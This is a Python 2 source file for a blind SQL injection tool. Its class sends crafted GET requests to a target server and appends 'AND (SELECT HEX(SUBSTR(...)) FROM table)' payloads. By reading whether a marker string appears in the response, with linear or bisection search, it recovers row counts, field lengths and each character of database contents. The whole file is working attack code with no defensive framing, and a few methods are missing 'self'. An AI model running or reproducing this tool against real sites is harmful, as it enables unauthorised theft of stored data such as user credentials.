import httplib

class Impromptu(object):
	def __init__(self):
		pass

	###########################################################
	# Returns true if it positions contains the selected char #
	###########################################################
	def getChar(self, server, https, path, rNum, cNum, char, fieldName, table, evl, txtEval, queryComments = '', rLimit = True):
		payload = "+AND+(SELECT+HEX(SUBSTR("+fieldName+","+str(cNum)+",1))+FROM+"+table

		if rLimit:
				payload += "+LIMIT+"+str(rNum)+",1"
				pass #END if

		payload += ")=HEX("+hex(ord(char))+")"
		payload += queryComments
		req = path+payload
		#if https:
		#	conn = httplib.HTTPSConnection(server)
		#else:
		conn = httplib.HTTPConnection(server)
		#pass
		conn.request('GET', req)
		response = conn.getresponse()
		text = response.read()
		#print char+" = "+str(txtEval in text)
		return (txtEval in text) == evl
		pass #END function

	######################################################
	# Returns the selected position char using bisection #
	######################################################
	def getChar_bj(self, server, https, path, rNum, cNum, fieldName, table, evl, txtEval, queryComments = '', rLimit = True):
		# -	Printable chars only
		maxVal = 127
		minVal = 31
		rVal = 0

		while maxVal != minVal: #	turnning around
			tmpVal = minVal+((maxVal-minVal)/2)
			#print "\n"+str(minVal)+", "+str(maxVal)
			if tmpVal != minVal:
				if self.testChar(server, https, path, rNum, cNum, tmpVal, fieldName, table, evl, txtEval, queryComments, rLimit):
					minVal = tmpVal
					pass
				else:
					maxVal = tmpVal
					pass #END if
				pass
			else:
				rVal = maxVal
				break
				pass #END if
			pass #END while

		return chr(rVal)
		pass #END function

	## - (bisection implementation) - ##################################
	# Test a if value is greatter than selected char return the result #
	####################################################################
	def testChar(self, server, https, path, rNum, cNum, char, fieldName, table, evl, txtEval, queryComments, rLimit):
		#print chr(char)

		payload = "+AND+(SELECT+HEX(SUBSTR("+fieldName+","+str(cNum)+",1))+FROM+"+table

		if rLimit:
				payload += "+LIMIT+"+str(rNum)+",1"
				pass #END if

		payload += ")>HEX("+str(char)+")"
		payload += queryComments
		req = path+payload

		#if https:
		#	conn = httplib.HTTPSConnection(server)
		#else:
		conn = httplib.HTTPConnection(server)
		#pass

		conn.request('GET', req)
		response = conn.getresponse()
		text = response.read()
		#print str(char)+" = "+str(txtEval in text)
		return (txtEval in text) == evl
		pass

	#############################
	# Returns a row char length #
	#############################
	def getLength(server, https, path, rNum, fieldName, table, evl, txtEval, queryComments = '', rLimit = True):
		if evl:
			text = txtEval
			pass #END if

		count = 0;
		while ((txtEval in text) == evl):
			count += 1
			payload = "+AND+(SELECT+LENGTH("+fieldName+")+FROM+"+table

			if rLimit:
				payload += "+LIMIT+"+str(rNum)+",1"
				pass #END if

			payload += ")>"+str(count)
			payload += queryComments
			req = path+payload
			
			#if https:
			#	conn = httplib.HTTPSConnection(server)
			#else:
			conn = httplib.HTTPConnection(server)
			#pass
			
			conn.request('GET', req)
			response = conn.getresponse()
			text = response.read()
			#print text+" --> \n"+str((txtEval in text))
			pass #END while
		return count
		pass #END function

	#############################################
	# Returns a row char length using bisection #
	#############################################
	def getLength_bj(self, server, https, path, rNum, fieldName, table, evl, txtEval, queryComments = '', rLimit = True):
		rVal = 0;

		if self.testRowLength (server, https, path, rNum, fieldName, table, evl, txtEval, queryComments, rLimit, 0) == False: #	Testing if numRows =< 0
			rVal = 0
			pass
		else:
			initVal = 1
			while self.testRowLength (server, https, path, rNum, fieldName, table, evl, txtEval, queryComments, rLimit, initVal): #	Getting an upper limit
				initVal *= 10
				pass #END while

			maxVal = initVal
			minVal = 1
			rVal = 1

			if initVal != 1:
				while maxVal != minVal: #	turnning around
					tmpVal = minVal+((maxVal-minVal)/2)
					#print "\n"+str(minVal)+", "+str(maxVal)
					if tmpVal != minVal:
						if self.testRowLength (server, https, path, rNum, fieldName, table, evl, txtEval, queryComments, rLimit, tmpVal):
							minVal = tmpVal
							pass
						else:
							maxVal = tmpVal
							pass #END if
						pass
					else:
						rVal = maxVal
						break
						pass

					pass #END while
				pass #END if
			pass #END if

		return rVal
		pass #END function

	## - (bisection implementation) - ########################################
	# Test a if value is greatter than row char length and return the result #
	##########################################################################
	def testRowLength (self, server, https, path, rNum, fieldName, table, evl, txtEval, queryComments, rLimit, count = 0):
		if evl:
			text = txtEval
			pass #END if

		payload = "+AND+(SELECT+LENGTH("+fieldName+")+FROM+"+table

		if rLimit:
			payload += "+LIMIT+"+str(rNum)+",1"
			pass #END if

		payload += ")>"+str(count)
		payload += queryComments
		req = path+payload
		
		#if https:
		#	conn = httplib.HTTPSConnection(server)
		#else:
		conn = httplib.HTTPConnection(server)
		#pass
		conn.connect();
		conn.request('GET', req)

		#print req

		response = conn.getresponse()
		text = response.read()
		return ((txtEval in text) == evl)
		pass #END fucntion

	#######################
	# Returns rows number #
	#######################
	def getRowsNum(server,  https, path, fieldName, table, evl, txtEval, queryComments = ''):
		print "Counting '"+fieldName+"' rows"

		if evl:
			text = txtEval
			pass #END if

		count = 0;
		while ((txtEval in text) == evl):
			payload = "+AND+(SELECT+COUNT("+fieldName+")+FROM+"+table+")+>+"+str(count)
			payload += queryComments
			print count,
			req = path+payload

			#if https:
			#	conn = httplib.HTTPSConnection(server)
			#else:
			conn = httplib.HTTPConnection(server)
			#pass

			conn.connect();
			##print req
			conn.request('GET', req)
			response = conn.getresponse()
			text = response.read()
			#print text+" --> \n"+str((txtEval in text))
			count += 1
			pass #END while
		return count-1
		pass #END function

	#######################################
	# Returns rows number using bisection #
	#######################################
	def getRowsNum_bj(self, server, https, path, fieldName, table, evl, txtEval, queryComments):
		print "Counting '"+fieldName+"' rows"
		rVal = 0;

		if self.testRowNum (server, https, path, fieldName, table, evl, txtEval, queryComments, 0) == False: #	Testing if numRows =< 0
			rVal = 0
			pass
		else:
			initVal = 1
			while self.testRowNum (server, https, path, fieldName, table, evl, txtEval, queryComments, initVal): #	Getting an upper limit
				initVal *= 10
				pass #END while

			maxVal = initVal
			minVal = 1
			rVal = 1

			if initVal != 1:
				while maxVal != minVal: #	turnning around
					tmpVal = minVal+((maxVal-minVal)/2)
					print "\n"+str(minVal)+", "+str(maxVal)
					if tmpVal != minVal:
						if self.testRowNum (server, https, path, fieldName, table, evl, txtEval, queryComments, tmpVal):
							minVal = tmpVal
							pass
						else:
							maxVal = tmpVal
							pass #END if
						pass
					else:
						rVal = maxVal
						break
						pass

					pass #END while
				pass #END if
			pass #END if

		return rVal
		pass #END function

	## - (bisection implementation) - ###################################
	# Test a if value is greatter than row number and return the result #
	#####################################################################
	def testRowNum (self, server, https, path, fieldName, table, evl, txtEval, queryComments = '', count = 0):
		if evl:
			text = txtEval
			pass #END if

		payload = "+AND+(SELECT+COUNT("+fieldName+")+FROM+"+table+")+>+"+str(count)
		payload += queryComments
		print count,
		
		req = path+payload
		#print req

		#if https:
		#	conn = httplib.HTTPSConnection(server)
		#else:
		conn = httplib.HTTPConnection(server)
		#pass

		#print req

		conn.connect();
		conn.request('GET', req)
		response = conn.getresponse()
		text = response.read()
		#print text

		return ((txtEval in text) == evl)
		pass #END function
